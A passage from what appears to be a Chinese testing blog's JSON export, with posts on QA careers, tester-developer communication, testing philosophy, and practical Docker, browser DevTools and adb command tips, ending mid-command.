所以总结起来，测试同学在字节该部门的关键字其实是：质量+专项+体验+效率，质量这边其实有大量的活动是外包同学可以去承担的，其他的部分专业性比较强，自行做团队建设可能会更好一点。\n总之在同一个公司的不同部门里，对于测试的态度可能是不尽相同的，之前讨论的腾讯去测试化也是腾讯的某一个bg，可能不一定是整个公司的行为。\n另外去测试化不是说完全不要测试，而是之前的一些必要的测试工作用一些成本更低的方式去做，比如外包。另外提高测试效率从另一方面说也就是降低测试的成本，是不是感觉有点卷起来了？想反内卷？字节的测试同学其实给我们提供了一个很好的思路，那就是换赛道。目前字节的测试有了4个赛道，而且除了质量赛道之外其他的赛道其实专业性还是很强的，所以也许在未来测试这边会分的越来越细，专业化越来越强，赛道越来越多。在某个赛道做专才或者在大部分赛道做通才都是不错的反内卷的方式吧。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%83%A8%E9%81%AD%E6%89%93%E8%84%B8%E5%AD%97%E8%8A%82%E6%9F%90%E9%83%A8%E9%97%A8%E7%AB%9F%E7%84%B6%E6%9C%89%E8%BF%99%E4%B9%88%E5%A4%9A%E6%B5%8B%E8%AF%95/","title":"惨遭打脸：字节某部门竟然有这么多测试"},{"content":"今天看到了有人给出了这样的观点，那就是测试并不能改进产品质量，觉得挺有意思的，所以把作者的原文翻译一下，希望对大家有所裨益。\n在世界上有一种天经地义的看法，那就是在软件开发过程的早期预防问题会比在测试后期发现问题带来更高质量的产品,但那不是真的。\n这是不真实的，但不是因为大多数人可能首先想到的原因。问题不在于尽早解决问题是个坏主意。这通常是一个非常好的主意。\n问题是，测试自身不会导致更高质量的产品，在所有。问题预防和测试是不同的追求。测试不能预防问题，测试不能改进产品。\n对我而已——一名教师和熟练测试的倡导者——这可能看起来很疯狂，但这是真的。称体重不会让你减肥。验血不会让你更健康。学校的标准化考试不会让孩子更聪明，当然也不会提高教育质量。\n测试可以做的是通过质疑产品以对其进行评估来提高我们对可能摆在我们面前的事物的理解和意识。测试——通过体验、探索和试验了解产品来评估产品的过程——帮助我们意识到可能需要解决的问题。\n在日常生活中，浴室秤上的某个特定读数可能会促使我们更加谨慎地进食，或者进行更多的锻炼。验血可能会促使医生开抗疟疾药物。这些标准化的学校考试可能会建议改变课程、教育资金或教师培训。但在有人采取行动之前，测试只会提高对现状的认识，而不是情况本身。\n在软件开发中，除非有人解决测试帮助我们发现的问题，否则改进不会发生。当然，如果问题没有被发现，改进的可能性就会大大降低——这就是测试如此重要的原因。测试帮助我们了解我们拥有的产品，因此我们可以判断是否是我们想要的产品。在需要改进的地方，测试揭示了改进的必要性。\n有些人认为测试要求我们操作产品，这是软件开发流程的一部分。确实这是是一种非常重要的测试，但也只是产品测试的一种方式而已。\n将产品更广泛地理解为某人生产的东西会很有帮助。这意味着我们可以有单元，模块，原型等多种手段的测试。\n尽管我们通常将其称为审查，但我们确实可以在产品开发之前就进行全方位的思考，在这种情况下，产品其实就是之前所有的讨论，设计和思考的产出物，测试其实在产品的研发的初期就开始了。\n测试的结果是通过这些活动进行的评估和学习。这种学习可以应用于产品——但它是响应测试而发生的事情，而不是测试本身，这是可以改进产品。\n正如测试不能改进产品一样，测试也不能防止问题。作为测试人员，我们有一个持久的信念，即我们被要求测试的任何东西都已经存在问题。也就是说，产品中的问题在我们遇到之前就已经存在。\n那么，如果测试不能预防问题，那又有什么用呢？测试可以帮助我们意识到存在的问题，然后人们可以进行更改以防止这些问题进一步发展。\n在开发早期尝试预防问题是一个好主意。如果尝试能够成功，我们就更有可能开发出高质量的产品。尽管如此，即使是高度规范的开发过程也可能会出现问题。至少有两种方法可以确定是否发生了这种情况。\n第一种方法是全程测试产品。通过与一系列客户互动并了解他们所做的事情，确定我们开发的东西就是客户想要的。通过检查和讨论，测试那些最初模糊然后却越来越清晰的设计。\n另一种方式是在代码开发的初级就做单元测试，然后在后续的构建步骤里进行集成测试，code review，静态代码扫描和自动化测试，从而找出组件自身的问题或者是配置的问题。这些形式的测试通常不是很深入——这是一件好事，因为深度测试可能需要时间、精力和准备，这可能会对开发人员造成更多负担。\n在开发人员测试的同时，测试人员专注于并执行深度测试。深度测试的目标是测试少见的、隐藏的、微妙的、偶尔发生的、紧急的错误，这些错误可以通过手工测试或者探索性测试来发现。\n如果您的问题预防和问题缓解策略是成功的，并且你的代码和产品是可测试的，那你不太可能在测试后期遇到一些显而易见的低级问题。如果您不需要测试和报告这些问题，那么后续的深度测试会相对更快、更容易。\n如果您的问题预防和问题缓解策略不成功，全面和深入测试是找出问题的一种方法。您发现的问题可以解决；可以改进产品，并且可以在产品交付之前防止业务和客户出现问题。\n当人们面临损失、伤害、不良情绪或价值降低的风险时，最好在为时已晚之前意识到问题，这就是测试的终极意义之所在。\n测试本身既不能防止问题也不能改进产品。但是测试确实可以预测需要预防的问题，并且测试可以照亮产品需要改进的地方。\n因为全文大部分是机翻，所以行文肯定有不流畅的地方，另外加上作者本身的笔法比较曲折，有一些点机器翻译可能难以驾驭，因此全文可能看起来观点比较分散，没有强一致性，不过大家可以简单的意会，忽略那些遣词造句里的机器感。\n总而言之作者的观点其实并不离经叛道，而且还是有一定的道理的，比如癌症筛查并不能治疗癌症，不过如果你尽可能早的可以通过筛查确定自身的风险，提前治疗和预防，那么癌症很有可能将不会发生。测试也是如此，测的再多开发和产品不去修改，那么产品本身的质量也不会得到改进，但是如果我们频繁的提前的进行测试，那么我们就可以尽早的暴露问题，我们的开发和产品也就会有足够的时间去进行修复工作。这也是为什么我们总强调bug生命周期的原因，测试并不只是简单的提bug，而是要尽早提bug，并保证bug得到及时修复并得到验证。\n原文地址：Testing Doesn\u0026rsquo;t Improve the Product (linkedin.com)\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%B9%B6%E4%B8%8D%E8%83%BD%E6%94%B9%E8%BF%9B%E4%BA%A7%E5%93%81%E8%B4%A8%E9%87%8F/","title":"测试并不能改进产品质量"},{"content":"前几天看到一篇blog讨论现代测试行业中存在的一些问题，我愿称之为测试行业的劝学篇。有些观点还是非常中肯的，翻译了一下，希望对大家有所帮助，下面是正文。\n在这篇博文中，我想强调我在测试行业看到的问题，以及我们都可以如何解决它。(你可能有不同的经历\u0026ndash;所以让我们在评论中分享吧！）。这是我在2022年初在阿布扎比MoT会议上发表的演讲的文字版。\n10年来行业发生了什么变化 在过去的十年里，我们见证了技术的大幅提升\u0026ndash;无人驾驶汽车、人工智能、AR / VR、区块链、无人机和机器人。许多测试和测试自动化从桌面转移到网络和移动设备上。\n从瀑布模型，许多企业走向了敏捷和Scrum。\n从编写自动化测试的大型和昂贵的工具，我们已经转移到小型，灵活，最重要的是 - 免费的库和工具。现在我们有智能报告系统和Docker容器中的测试。现在在云端并行运行成千上万的测试用例并其实不那么昂贵。\n但与此同时，许多事情和声明仍然没有改变。\n以下是一些在测试人员中不断肆虐的无尽话题\n\u0026ldquo;手工测试已死！\u0026rdquo; \u0026ldquo;让我们把一切都自动化吧! 通过UI\u0026ndash;这才是最好的！\u0026quot;*。 \u0026ldquo;SDET是测试工程师进化的高峰! 我想成为像谷歌一样的人！\u0026rdquo; \u0026ldquo;我在开发领域找不到工作，所以我将做一年左右的测试，然后再尝试转行。\u0026rdquo; \u0026ldquo;测试人员的工资都在底部！\u0026rdquo; \u0026ldquo;测试工程是一份低技能专业人士的工作！\u0026rdquo;\n但为什么行业中会出现这样的情况？问题会不会是别的原因呢？我看到了哪些问题？\n现代测试的问题 我将把问题分为两个大组。\n对技术的追求 **寻找银弹。**一些工程师为一个项目（和一个背景）创建了一个成功的框架，然后开始把它拉到所有其他的项目中作为一个 \u0026ldquo;完美的解决方案\u0026rdquo;。这不是可重用性，它只是将一把锤子怼所有的钉子和螺栓。 **面向框架的自动化。**在一些项目中，工程师们急于编写完美的框架，而忘记了测试本身。结果是，我们有3-6个月的开发时间没有测试！。但是对于客户来说，没有测试是自动化应用不充分的的直接指标。 **专注于流水线通过的崇拜者。**在这种情况下，已经成功地将测试纳入CICD管道的测试工程师开始迷恋于使测试一直保持绿色。这种痴迷往往导致忽略甚至删除不稳定的测试（这导致忽略了被忽略的测试背后的问题）。 **简历驱动的开发。**许多测试人员只考虑工作和项目，作为在简历中获得一个花哨的新行的方式。没有任何关于深化技能和用测试和自动化解决业务问题的内容。 **只专注于短期目标。**许多工程师只喜欢快速的解决方案。这种对自动化测试的态度是很普遍的。工程师们很快就写出了 \u0026ldquo;东西\u0026rdquo;，而没有考虑到可维护性，就跑去做新项目了。 技能和知识水平不足 知识的缺乏可以有多种形式。\n技术知识\n在面试中，资深候选人往往能迅速回答任何关于测试的问题。他们可以为你画一个 \u0026ldquo;测试金字塔或任何你想要的数字\u0026rdquo;，告诉你世界上所有的测试设计技术，并写出完美的测试报告。但是，当你问及基本技术方面的问题（如HTTP或网络如何工作），候选人很快就会失去信心。\n你可以告诉我，不是每个项目都需要特定的知识。这倒是真的。但测试工程师应该知道（或至少知道）基本的技术知识。理想情况下，比谷歌搜索中的第一个链接更深入一点。\n90%的现代系统以这种或那种方式与网络一起工作，发送消息或请求，并使用数据库或分布式存储。多层的抽象可以覆盖它\u0026ndash;但总的来说\u0026ndash;它的工作原理都是类似的。\n编程和架构\n一些测试工程师仍然认为，学习编程是复杂和不必要的。让程序员来写代码吧!\n另一部分是那些已经学会了一点代码，但只集中精力于UI测试的人。这些测试之外的世界似乎并不存在。\n在测试工程师中，关于系统结构和它们如何工作的知识是一种稀缺的技能。所有这些都被认为是有经验的 \u0026ldquo;大胡子 \u0026ldquo;架构师的工作，或者只有有十几年经验的高级开发人员才能做。\n但是，如果不知道系统的内部和相互之间是如何工作的，就很容易错过很多关键的错误。另一方面，缺乏技术知识将使我们很难在测试报告中描述这些问题。\n我并不是说，如果不了解系统的组成部分，就不可能指出系统糟糕的不可测试性。结果是，我们继续编写脆弱的XPath定位器，因为没有人给元素添加ID。\n对业务和产品的了解\n当然，这一切都取决于项目的情况。有一些项目，测试团队就像在工厂生产线上工作一样：开始构建，测试，然后传递给下一个环节（不问任何问题）。\n测试工程师明显缺乏产品知识。很少有工程师与用户或客户支持一起工作。但是那些人可以提供关于应用中最危险的部分的有用信息，或者对可用性系统进行反馈。\n甚至更少的测试和自动化工程师思考他们的工作如何影响业务。那些自动化测试是否为公司节省了资金？或者比人工测试更快地提供问题反馈？\n工程师的个人发展\n关于个人发展，有两个重要的工程师群体存在。\n\u0026ldquo;我为什么要学习编程（任何其他技能）？那会使我成为一个不太熟练的测试工程师！\u0026rdquo; \u0026ldquo;据说我想学习，但我在等待一年后的反馈。我的经理或测试负责人会来告诉我需要学习什么。\u0026rdquo; 但这里有最关键的一点。只有你对个人的技能、知识和职业生涯的发展负责！你的经理只（或其他任何一个人）对你的工作负责。\n你的经理（或互联网上的任何其他人）将无法为你创建一个技能地图。只有你知道自己的优势和劣势。只有你知道（或猜测）你在知识方面有哪些差距。只有你能了解如何获得这些知识并达到一个新的水平（并获得梦想的提升）。\n你的上级只能调整你的计划并指出公司的资源投入情况：比如说参加会议或其他发展的预算。\n不确定性的恶性循环 那么，一个普通的测试工程师日常的灵魂拷问是什么呢？\n\u0026ldquo;我不会写代码\u0026ndash;我不是一个开发者.\u0026rdquo; \u0026ldquo;我有什么资格和架构师讨论系统组件的架构或可测试性？\u0026rdquo; \u0026ldquo;DevOps团队已经关闭了流水线中不稳定的测试\u0026ndash;好吧，他们更知道应该怎样做.\u0026rdquo; \u0026ldquo;经理一直问我：你到底在测试什么？为什么是那个？还有那个？\u0026rdquo; \u0026ldquo;企业只是想削减成本，干掉整个部门的不必要的测试人员\u0026hellip;.\u0026rdquo; \u0026ldquo;我怎么知道我们的用户有什么问题？\u0026rdquo;\n结果，大多数测试工程师陷入了一个不确定的无限循环。\n测试人员不能正确地向团队、其他工程师、管理层和企业证明他们的存在意义。在这种情况下，测试人员很难在团队内部建立信任和信心。 测试工程师的积极性越来越低。转向软件开发或管理的想法却随之增长。 许多有经验的高级工程师离开了测试行业。成功的测试人员的案例越来越少。测试工程师影响产品和流程并进行技术改进的案例\u0026ndash;用手指都能数出来。会议上的成就和故事归结为 \u0026ldquo;嗯，我们得到了这个框架或这个测试管理的工具\u0026ndash;现在一切都很美好\u0026rdquo;。缺少能够编写新库和工具的人。没有人去测试复杂且科学的软件。没有人做测试领域的研究。 业界继续认为，测试人员是 \u0026ldquo;只按按钮，几乎什么都不做 \u0026ldquo;的人。年轻的测试工程师也看到了同样的情况，因此他们的积极性和向上的动力更低。 如何改变这种状况 **为你的职业发展准备一个计划。**掌握什么技能，学习什么，以及如何在工作中使用这些技能。如果你能在公司获得知识和技能\u0026ndash;那就很好! 如果不能\u0026ndash;寻找另一个项目或公司。总有一个选择\u0026ndash;它就在你的手中。 **学习编程。**我不是在谈论高级开发人员水平的技能。但是写脚本的能力可以从部署或配置中去除很多单调的工作。阅读和理解别人的代码，可以更好地了解系统的总体工作原理，以及哪些情况还没有被涉及到。 **加深你对应用程序和系统架构的了解。**从你现在正在测试的系统开始，分解它。拆解架构图。思考一个单独的组件如何和在哪里 \u0026ldquo;挂掉 \u0026ldquo;以及系统将如何反应。和架构师们聊一聊吧。 **如果你正在编写脚本或自动化测试，总是问自己：谁将使用我的代码，他们如何使用我的代码（测试）？**它写得够清楚吗？是否有详细的报告？一个新的工程师会有多容易理解这些代码？ **了解用户如何使用你的被测系统。**你的产品商业模式是什么？哪些是风险最大的部分？这些信息将帮助你测试对用户至关重要的部分，并为企业节省资金。 ","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E4%BD%8E%E4%B8%8B%E8%AE%BA%E6%88%96%E7%8E%B0%E4%BB%A3%E6%B5%8B%E8%AF%95%E8%A1%8C%E4%B8%9A%E6%89%80%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/","title":"测试低下论或现代测试行业所遇到的问题"},{"content":"原文应该无法访问到，这里就不给出链接了。原文的标题是：DO’S and DON’TS in Communication Between Developer and QA Engineer。我做了一些简单的翻译，大家应该可以大概了解到作者的真实想法。本文只是翻译而已，作者的观点仅代表她的个人看法。\n在担任 QA 工程师多年后，我决定分享一些有关与开发人员沟通的技巧。\n这些不要做 **如果不紧急，不要分散开发人员的注意力。**不要马上走到他的办公桌前。首先通过 Messenger 询问或提前安排会议。我意识到，一旦自己开始写代码的时候，当有人过来打断我的时候，我需要花费大量的时间和精力才能再次进入之前写代码的沉浸状态，这种中断根本不会增加生产力。\n**别害怕寻求帮助。**你不可能什么都知道，问别人是有没关系的，因为这比假装你很酷要好！不过要确保你理解了答案，不要问同样的问题两次。大家都在同一条船上，如果每个人都有一支桨，我们就可以朝着一个方向前进，这对每个人都有好处。\n**不要相信开发人员的话。**您需要找到证据来证明开发人员对“一切都应该没问题！”或“我只是改了代码中的一个字符串，它不会破坏任何逻辑”的信心。\n**不要责备。**不要固守消极，尝试解决问题，对事不对人。稍后我们可以决定如何避免将来出现类似问题。没有人是完美的，错误是不可避免的。主要目标是有能力做出健康的反应，然后做好自己的工作就好了。\n**别偷偷摸摸直接给开发人员分配给缺陷。**与跟开发人员在未经 QA 批准的情况下关闭bug有异曲同工之妙，这可能会令人生气的。\n不要对开发人员进行事无巨细的管理。“你检查缺陷了吗？”，“现在怎么样？”，“你什么时候修复错误？”。这很烦人，他们不能更快地解决问题。只需将自己置于开发人员的位置即可。\n**别把事事都放在心上，脸皮可以厚一点。**不要情绪化，不以物喜，不以己悲，不需要对别人的无意间的言行睚眦必报。你要学会同傲慢的人打交道，它实际上可以应用于任何人。这就是为什么厚脸皮和委婉的表达是必须的。\n可以这么做 **与开发人员交流知识。**让他们了解您的测试方法，为每个与你合作的开发人员找到“access_key”，高告诉他们你会如何进行测试，这可以帮助你避免部分错误。但是，由于一些原因，这并不总是可能的。第一，时间不够。其次，公司流程不允许这样做。最后，开发者出于多种原因不愿意与某人合作。但是，如果你能找到我上面提到的“access_key”，从长远来看，保持健康的关系会容易提升产品质量。\n**学会说服。**如果你想在工作中得到一些非测试方面的提升，这是一项有用的技能。寻求支持并将您的计划变为现实，不过如果你在你的陈述中感到孤独，也许你的计划或想法是有改进空间的。所以，不要为了说服而说服，让别人接受你并不总是正确的事实，学会倾听和倾听你周围的人。\n**说实话。**否则，它会很快毁掉你的声誉。或者这取决于你是一个多么好的骗子，不是每个人都是老罗。\n**准备好为你提的bug辩护。**有时候你必须捍卫需要修复的缺陷的重要性。但是你必须在你的陈述中说明自己的观点，让别人信服。随着时间的推移，这会让你得到其他人的信任并节省公司的资金成本。\n**在压力下保持冷静。**我知道，这很难。当每个人都不断催促你或你的团队时，你很难不乖乖就范。然而，说“不”是我们工作的一部分，即使这不是流行的观点。当然如果有人把你推到墙上或用枪指着你的头，这条规则就不起作用。\n**与开发人员讨论测试用例。**根据我的经验，这很难做到。这需要双方的时间和奉献精神，魅力和测试同学的强大说服力。我已经这样做了一段时间，但我无法采用这种方法。我从与开发人员的此类会谈中看到了巨大的好处。但是，我可能看不到的东西可能会告诉我相反的情况。你怎么认为？\n**在bug描述中要准确。**如果可以，请使用开发人员的语言。在其他情况下，让你的表述尽可能的简单。它应该是瑞典语中的“lagom”。具有良好的规模结构并为开发人员提供足够信息，让别人知道你描述的是到底是什么。\n**鼓励队友深入了解产品。**团队中的这种意识将减少愚蠢的bug数量。根据我的经验，低级的bug会消耗大量精力来报告它们。这些bug最好直接就预防住，让我们专注于更重要的事情。而不是让我们报告错误的*字体大小，*测试的边缘情况、安全性、性能等。\n**要有耐心。**不是每个人都是好相处的，要学会应对困难的、自恋的人。这是适用于任何人的一般性规则。\n一旦我开始为这篇文章写想法，我决定记下我自己的想法，然后再与““Lessons Learned in Software Testing. A Context-Driven Approach” —— Cem Kaner、James Bach 和 Bret Pettichord 撰写的一本书做比较。我是故意这样做的，所以这本书不会影响我对这个话题的看法。如果您同意它们，您可以完全阅读他们提供的课程并每天应用它们。\n根据我的观察，有些想法已经存在于第 7 章中。它让我感到温暖，因为我获得并放入下面清单中的经历让我想到有人也有同样的想法。\n我读过的一些课程实际上不在我的清单上，这意味着我学到了一些新东西，可以尝试将这些课程融入我的 QA 策略中。\n你读过我提到的那本书吗？在与开发者的交流中，您有什么样的观察？如果你有什么要补充的，请留言哦。不管你是不是QA。不同的观点永远不会受到伤害。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%A6%82%E4%BD%95%E8%B7%9F%E5%BC%80%E5%8F%91%E6%B2%9F%E9%80%9A/","title":"测试工程师如何跟开发沟通？"},{"content":"Docker现在是许多 QA 工程师的常用工具。它用于生产环境和测试环境或两者兼而有之。docker 的文档制作精良，相对容易理解，但有时我们需要一些常用命令来解决问题。\n在这里我列举一下对于测试同学来说比较值得去弄明白的docker秘籍。\n如何使用不同的参数运行已经启动的 docker 容器？ 可以用这个工具：https://github.com/lavie/runlike/\n使用方法: runlike -p \u0026lt;container_name\u0026gt; ，这样就可以拿到该容器第一次启动时候用的具体命令了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 runlike -p testservice docker run \\ --name=testservice \\ --user=test \\ --env=KAFKA_HOST=172.17.0.1:9092 \\ --env=PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin \\ --env=LANG=en_US.UTF-8 \\ --workdir=/home/testapp \\ -p 8015:8080 \\ --restart=always \\ --log-driver=journald \\ --runtime=runc \\ --detach=true \\ myrepo/testservice:master-1374 这时候我们就可以修改一些参数，比如端口号信息，生活变得容易了一些。\n如何在 docker 容器中运行本地 bash 脚本？ 1 cat local_script.sh | docker exec \u0026lt;container_name\u0026gt; /bin/bash 如何重启或移除所有的容器？ 这个技巧非常管用，推荐牢记。\n1 2 docker stop $(docker ps -a -q) docker restart $(docker ps -a -q) 如何清理旧的 docker 镜像、容器和卷？ 1 docker system prune -a 如何过滤 docker ps 命令，以仅获取所需的信息，例如容器名称、状态和镜像？ 1 docker ps --format \u0026#34;table {{.Names}}\\t{{.Status}}\\t{{.Image}}\u0026#34; 如何保存和恢复 docker 容器？ 1 2 3 docker commit -p \u0026lt;CONTAINER_ID\u0026gt; \u0026lt;YOUR_BACKUP_NAME\u0026gt; docker save -o \u0026lt;CONTAINER_FILE\u0026gt;.tar \u0026lt;YOUR_BACKUP_NAME\u0026gt; docker load -i \u0026lt;CONTAINER_FILE\u0026gt;.tar 如何将常用的docker命令简化成别名？ 如果你是docker的重度用户的话，这个能力非常实用。\n1 2 3 4 5 dexec() { docker exec -i -t $@ /bin/bash ;} dlogs() { docker logs --tail=all -f $@ ;} dport() { docker port $@ ;} dvol() { docker inspect --format \u0026#39;{{ .Volumes }}\u0026#39; $@ ;} dip() { docker inspect --format \u0026#39;{{ .NetworkSettings.IPAddress }}\u0026#39; $@ ;} 总结 希望以上的命令会对大家有所帮助。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E5%BF%85%E4%BC%9A%E7%9A%84docker%E7%A7%98%E7%B1%8D/","title":"测试人员必会的docker秘籍"},{"content":"今天我将谈论浏览器技巧——你甚至可能没有意识到这些小功能的存在，主要是在浏览器的“开发者工具”部分。 这些不是关于代码，而是使测试更容易一些的方法。\n响应式模式 这是我之前在做前端开发时候每天必用的工具，因为那时候响应式前端框架刚刚兴起，我们都希望用一套代码实现pc端和移动端的统一体验。这个工具是chrome和firefox上的轻量手机模拟器，可以模拟网页在不同设备上的显示情况。在 Firefox 中，它是 Tools-\u0026gt;Web Developer-\u0026gt;Responsive Design Mode，而在 Chrome 中是 View-\u0026gt;Developer tools，然后单击设备工具栏 - 看起来像全尺寸屏幕旁边的移动设备图片 . 单击后，您将看到 chrome 认为该网站将如何显示在设备上。\n自己编辑网页 如果您发现前端错误，你可以直接编辑页面上的html代码，并查看是否修复了错误。 以chrome为例，就是这样：\n打开开发者工具，选择第一个tab页也就是Elements，选择你想要编辑的html代码， 在左侧会有三个点，单击它们会出现一个包含“Edit as HTML”的菜单； 然后您可以编辑元素本身。 当您按 ENTER 或 RETURN 时，网页就会发生变化了。\n这意味着你可以做的不仅仅是查找错误，而是实际提出修复方案。 这样依赖测试是开发团队的一个完全参与的部分了，从辅助变成了输出。\n离线模式 有时候我们会希望测试一下网页在弱网甚至是断网时候的表现，直接关wifi或者拔网线的话其实挺麻烦的，这时候离线模式就派上用场了。\n以chrome为例，打开开发者工具，选择Network标签，紧挨着的下面一行有个默认是\u0026quot;No throtting\u0026quot;并且旁边带个小三角箭头的东西，这其实就是个下拉列表了，点开可以选择\u0026quot;Offline\u0026quot;，如果你想模拟弱网的话，还可以选择\u0026quot;Slow 3G\u0026quot; 等选项。\njavascript控制台 这个控制台里可以执行任意的js代码，最有利的一点是我们可以在控制台里直接写代码去调用后端接口进行调试，之前阿里内部员工抢月饼的脚本应该就是在控制台里运行代码去实现的。当我们学会操作dom之后，我们还可以直接用控制台写代码去实现一些页面上的简单自动化，提高我们的测试效率。\n修改文件的保存路径 在 Firefox 中，在首选项下，你可以看到下载的位置选项。 如果您像我一样，每天可能会保存数十个文件，那么将它们直接放在桌面上将为您节省两次点击。 这样一天就是五十次点击，也许一周会节约一两分钟。 这样你在花时间阅读我这篇文章时候就不会感到内疚了。\n观察页面如何加载 页面是逐步加载完成的，我们可以录制整个页面加载的过程来找到页面的性能瓶颈。\n打开开发者工具，选择\u0026quot;performance\u0026quot;标签，记得勾选上\u0026quot;Screenshots\u0026quot; 这个勾，然后点录制按钮，就是那个圆圈，刷新页面就可以了。\n获得免费的前端性能报告 您可以对每个网页的性能、可访问性、最佳实践、搜索引擎优化以及它如何根据屏幕大小添加功能进行评分，所有这些都是免费的，内置于 Google Chrome 中。 转到开发人员工具并单击“lighthouse”选项卡， 向下滚动以了解有关您的分数的详细信息 - 以及如何提高分数！\n就是这样。 只需点击几下鼠标，就可以学会加快测试速度的七个技巧，也许没有人会预料这些技巧可能具有不错的价值。\nChrome 和 Firefox 的问题不在于缺少这些工具，而是工具太多了——工具太多，很难研究并找到一些你会经常使用的真正强大的技巧。\n你最喜欢浏览器的什么自带工具呢？ 请在评论中留下您的想法。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E4%B8%8D%E5%8F%AF%E4%B8%8D%E7%9F%A5%E7%9A%847%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/","title":"测试人员不可不知的7个浏览器小技巧"},{"content":"最近一项针对开发人员 GitLab 调查发现，与开发过程中的任何其他流程相比，测试造成的项目延期其实会更多。换句话说，很多开发人员认为项目延期的主要原因其实就是因为测试，那么测试真的是项目开发过程中的瓶颈吗？有人收集了一些有意思的数据，我们不妨先看一下。\n超过80%的项目还在进行手工测试，哪怕是在大企业和大组织中\n超过50%的测试人员每周花费5-15小时去处理测试数据(平均等待测试数据的时间相当于是2周)\n84%的测试人员会因为测试环境产生的各种问题而造成例行的延期(平均等待测试环境被修复的时间相当于32天)\n只有30%的受访者认为他们的devops实践有1-3年的历史\n25%的团队要么是没有自动化测试要么是刚开始准备了解如何去做自动化测试\n52，这是平均1个系统在进行测试时候需要进行交互的依赖系统数量\n59%的测试人员认为需求的快速变化是自动化测试的最大挑战\n不过上面的数据统计仅仅是冰冷的数据而已，大家觉得测试到底是不是开发过程中的瓶颈呢？欢迎留言讨论。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E6%98%AF%E6%95%B4%E4%B8%AA%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B%E7%9A%84%E7%93%B6%E9%A2%88%E5%90%97/","title":"测试是整个开发过程的瓶颈吗"},{"content":"最近有公司裁员火到上了热搜，今年就业形式不容乐观，相信有不少同学正在努力找工作中，另外可能有一些同学被裁员的阴影所笼罩，也许在默默的为下一份工作而努力。看到一些开发同学正在刷题刷的飞起，而与之对应的是工作机会的减少，简历字面要求的提高，以及面试周期的增加，据说现在面试题难出了天际，其实也是一种变相提高门槛的表现，那么这个时间点测试同学在面试之前是否需要刷题呢？\n答应是不一定，具体情况可以具体对待。\n初级测试同学 一些公司对初级测试的同学的要求不是特别高，人聪明能干活就行，所以可能不需要频繁刷题，但一些简单的编程能力还是要有，防止被一些不太复杂的代码题被动过滤，如果时间不是很充裕的话，优先级是了解测试流程，测试方法，测试工具，各种测试种类（功能性能接口等），最后才是简单的算法和数据结构题。\n中高级测试同学 其实中高级在技术上的要求差不多，所以放到一起讲，技术的广度上中高级的区别不大，不过深度上高级同学可能需要有一个强点可以侧重，能讲出东西来，让人信服。这两个职级都强烈建议刷题，不过优先刷简单的题先，中等难度的适当刷一点点，有些实在是看不明白的放弃也不可惜，高难度的题的就不用刷了，如果在面试中遇到的话，那这个职位可能是为某些人高度定制化的，或者根本就没有诚心招人，做不出来也不要紧。至于算法，可以了解比较简单的排序递归等，高级一点的贪心算法和动态规划可以适当的看看，大概知道概念，做不出来也问题不大。数据结构的话推荐优先了解二叉树及各种变种，更复杂的数据结构不看也可以。\n管理岗位 管理岗位的话一般来说不用刷题，因为管理者可能很多年都没写过代码了，实在是霸王硬上弓的话可能会让场面一度显得比较尴尬。不过不写不意味着就可以不知道，数据结构和算法应该有所了解，比如merge sort写不出来具体的实现，但是其过程和原理应该是可以表述清楚的。算法的话可以了解一些简单的，数据结构也是从二叉树开始，结束在你没有时间去了解的地方。\n测试开发 岗位相对较少，所以可能会更卷一些。建议初中级难度的全部刷完，高级难度如果能熟练掌握的话就转开发吧，大部分的开发没有花时间准备的话中高级题都很难写出来，简单题翻车也不是没有可能。\n其他测试相关岗位 比如pmo，qa等质量度量和流程管理类的角色，其核心竞争力与刷题无关，不刷是完全没问题的。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%B5%8B%E8%AF%95%E5%90%8C%E5%AD%A6%E6%89%BE%E5%B7%A5%E4%BD%9C%E8%A6%81%E4%B8%8D%E8%A6%81%E5%88%B7%E9%A2%98/","title":"测试同学找工作要不要刷题"},{"content":"Android Debug Bridge是我们比较常用的命令行工具，该工具可以在Android 设备上执行不同的操作，例如安装或卸载应用程序、输入文本、捕获屏幕截图等，下面是一些常用的adb命令及使用场景。\n列出连接的设备 1 adb devices 上面的命令可以列出设备的序列号和状态，如果连接了许多设备并且我们想将它们区分开来，我们可以运行带有-l选项的命令以列出有关设备的更多详细信息。\n1 adb devices -l 此命令向我们显示设备、型号等。\n安装应用程序 通过提供.apk文件的路径，可以在设备上安装应用程序\n1 adb install \u0026lt;path_to_apk\u0026gt;.apk 如果连接了多个设备，直接运行上面的命令是会报错的，这时应使用-s选项指定目标设备的序列号。\n1 adb -s \u0026lt;serial_number\u0026gt; install \u0026lt;path_to_apk\u0026gt;.apk 这里的-s是一个常用选项，用于指定具体的设备，会在adb命令中大量使用到。\n列出package adb shell 中的包管理器(package manager)工具可用于列出设备上安装的所有包\n1 adb shell pm list packages 后面接grep命令可以实现更为精确的过滤\n1 adb shell pm list package | grep what_you_want 启动Activity 可以用下面的命令来找到指定的package中的某个activity\n1 adb shell dumpsys package | grep \u0026lt;package_name\u0026gt; | grep Activity 然后下面的命令可以启动activity\n1 adb shell am start \u0026lt;package_name\u0026gt;/\u0026lt;activity_name\u0026gt; 比如下面的命令可以启动google map\n1 adb shell am start com.google.android.apps.maps/com.google.android.maps.MapsActivity 在浏览器中打开URL 这里要用到工具是活动管理器am，activity manager\n1 adb shell am start -a 